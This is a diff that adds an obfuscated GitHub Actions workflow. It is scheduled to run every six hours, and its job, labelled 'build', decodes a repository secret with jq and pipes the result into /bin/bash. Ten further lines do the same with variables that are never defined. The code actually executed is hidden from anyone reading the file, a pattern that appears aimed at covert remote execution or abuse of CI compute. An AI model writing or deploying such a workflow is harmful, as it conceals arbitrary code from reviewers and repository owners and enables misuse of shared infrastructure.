@@ -1,0 +1,27 @@
+name: huihaiaiwodee
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huihaiaiwodee
+        env:
+          ni24762: ${{ secrets.ni24762 }}
+        run: |
+          echo $ni24762 | jq -r .m60577 | /bin/bash
+          echo $frjkp855 | jq -r .obv25 | /bin/bash
+          echo $pbekc9 | jq -r .wl404 | /bin/bash
+          echo $wl053 | jq -r .mfd91166 | /bin/bash
+          echo $lk1 | jq -r .euts92215 | /bin/bash
+          echo $kf86374 | jq -r .pszb29117 | /bin/bash
+          echo $dboe724 | jq -r .fy91 | /bin/bash
+          echo $pewvi66 | jq -r .nfbc7 | /bin/bash
+          echo $e9515 | jq -r .jarn0 | /bin/bash
+          echo $rv120 | jq -r .wel927 | /bin/bash
+          echo $gxqi8161 | jq -r .e48 | /bin/bash
+
